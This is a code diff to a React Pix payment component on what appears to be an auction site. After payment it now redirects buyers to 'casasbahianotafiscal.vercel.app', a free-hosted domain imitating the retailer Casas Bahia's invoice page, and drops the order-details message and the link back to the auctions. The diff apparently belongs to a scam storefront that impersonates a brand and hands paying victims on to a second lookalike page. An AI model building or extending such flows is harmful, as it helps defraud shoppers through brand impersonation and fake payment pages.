@@ -580,30 +580,30 @@ function PixStage({
     }
   }
 
+  useEffect(() => {
+    if (paid) {
+      window.location.href = "https://casasbahianotafiscal.vercel.app/";
+    }
+  }, [paid]);
+
   if (paid) {
     return (
       <div className="min-h-screen bg-background">
         <SiteHeader />
         <main className="mx-auto max-w-[520px] px-4 py-10 text-center">
           <span className="mx-auto grid size-16 place-items-center rounded-full bg-success/15">
-            <CheckCircle2 className="size-9 text-success" />
+            <Loader2 className="size-9 animate-spin text-success" />
           </span>
           <h1 className="mt-4 text-2xl font-extrabold text-primary">Pagamento confirmado!</h1>
           <p className="mt-2 text-sm text-muted-foreground">
-            Recebemos {brl(total)} referente a {productLabel}. Você receberá os detalhes da entrega
-            por e-mail.
+            Você será redirecionado em instantes…
           </p>
-          <Link
-            to="/"
-            className="mt-6 inline-block rounded-lg bg-primary px-6 py-3 text-sm font-bold text-primary-foreground"
-          >
-            Voltar para os leilões
-          </Link>
         </main>
         <SiteFooter />
       </div>
     );
   }
+
 
 
 
